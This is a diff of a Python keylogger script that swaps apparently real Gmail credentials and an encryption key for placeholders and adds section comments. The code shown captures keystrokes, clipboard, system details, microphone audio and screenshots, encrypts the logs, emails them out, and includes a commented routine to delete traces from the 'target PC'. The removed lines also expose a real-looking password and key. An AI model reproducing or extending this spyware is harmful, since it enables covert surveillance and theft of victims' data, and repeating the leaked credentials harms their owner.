@@ -34,21 +34,22 @@ audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
 time_iteration = 15
 number_of_iterations_end = 3
-email_address = "zuhinsaaf6@gmail.com"
-password = "gabarone"
+email_address = "email@gmail.com"
+password = "email_pass"
 username = getpass.getuser()
-key = "Eyq6t8uWLXiGQWj9TfiTLs69xk4nfKPASbQ1eQj_nO0="
+key = "encryption key"
 
 keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
 clipboard_information_e = "e_clipboard.txt"
 
-toaddr = "zuhinsaaf6@gmail.com"
+toaddr = "email@gmail.com"
 
-file_path = "C:\\Users\\mzmin\\Documents\\Grant Keylogger\\Project"
+file_path = "C:\\path_to_file"
 extend = "\\"
 file_merge = file_path + extend
 
+# email functionality
 def send_email(filename, attachment, toaddr):
 
     fromaddr = email_address
@@ -90,6 +91,8 @@ def send_email(filename, attachment, toaddr):
 
 #send_email(keys_information, file_path + extend + keys_information, toaddr)
 
+
+# extract PC information
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
@@ -110,6 +113,8 @@ def computer_information():
 
 #computer_information()
 
+
+# Clipboard information
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
@@ -123,6 +128,7 @@ def copy_clipboard():
 
 #copy_clipboard()
 
+#capture microphone
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -134,12 +140,16 @@ def microphone():
 
 # microphone()
 
+
+#get screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
 
 #screenshot()
 
+
+# how many times the keylogger runs
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
@@ -201,8 +211,9 @@ while number_of_iterations < number_of_iterations_end:
         stoppingTime = time.time() + time_iteration
 
 computer_information()
-copy_clipboard()
+#copy_clipboard()
 
+# encrypting files and emailing
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information , file_merge + keys_information]
 encrypted_file_name = [file_merge + system_information_e, file_merge + clipboard_information_e , file_merge + keys_information_e]
 
@@ -224,6 +235,7 @@ for encrypting_file in files_to_encrypt:
 
 time.sleep(120)
 
+# remove files from target PC
 # delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 # for file in delete_files:
 #     os.remove(file_merge + file)
